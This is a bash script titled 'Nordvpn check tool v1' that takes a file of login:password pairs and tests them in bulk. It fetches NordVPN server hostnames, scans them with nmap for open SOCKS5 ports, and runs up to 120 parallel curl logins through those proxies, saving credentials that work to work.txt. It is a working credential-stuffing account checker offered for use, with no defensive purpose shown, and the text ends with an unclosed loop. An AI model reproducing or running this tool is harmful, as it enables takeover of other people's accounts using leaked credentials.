if [[ $# -eq 0 ]] ; then
    echo 'Nordvpn check tool v1'
    echo 'Created by matrix'
    echo 'Run like bash chk2.sh filename.txt'
    echo 'filename.txt must be in login:password format'
    echo 'Working proxy accounts will be stored into work.txt'
    exit 0
fi

echo 'Nordvpn check tool v1'
echo 'Created by matrix'
echo 'Working proxy accounts will be stored into work.txt'
sleep 3

fn=$1
t=`wc -l $fn`
out=work.txt
threads=120
ct=0
cct=0

echo Getting proxy list
curl --silent "https://api.nordvpn.com/v1/servers/recommendations" | jq --raw-output 'limit(100;.[]) | .hostname' >/tmp/tm0
echo Check with nmap open ports
nmap -Pn -n --open -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
echo _________________________________
echo Starting total for checking $t
echo _________________________________

pr=`shuf -n 1 /tmp/tm1`

while read p; do
  cct=$((cct+1))
  pr=`shuf -n 1 /tmp/tm1`
  ct=`ps|grep curl|wc -l`
# ct=$((ct+1))
  if [ "$ct" -ge "$threads" ]; then 
  while [ true ]; do
    if [ `ps|grep curl|wc -l` -ge "$threads"  ]; then
      echo We sleep 5 sec. Current proc running `ps|grep curl|wc -l` Limit : $threads
      echo Working $cct / $t
      sleep 5
      ct=`ps|grep curl|wc -l`
    else
      ct=`ps|grep curl|wc -l`
      echo We continue, current load  $ct of $threads
      break
    fi
  done
  fi
  set -- "$p" 
  IFS=":"; declare -a Array=($*)  
  (curl --connect-timeout 20 -m 60 -sSf -U \"${Array[0]}:${Array[1]}\" --socks5 $pr:1080 2ip.ru > /dev/null 2>&1 || status=$?
  if [ "$?" != "7" ]; then 
    echo "${Array[0]}:${Array[1]}"  >>$out
  fi)&
done < $fn

while [ true ]; do
  if [ `ps|grep curl|wc -l` -ge "2"  ]; then
     echo We sleep 5 sec. Current proc running `ps|grep curl|wc -l` Limit : $threads
     sleep 5
  else
     echo We continue, Current proc running `ps|grep curl|wc -l`
     cp work.txt work_all.txt
     cat work_all.txt|sort|uniq >work.txt
     echo total work:`wc -l work_all.txt` clean:`wc -l work.txt`
     break
  fi

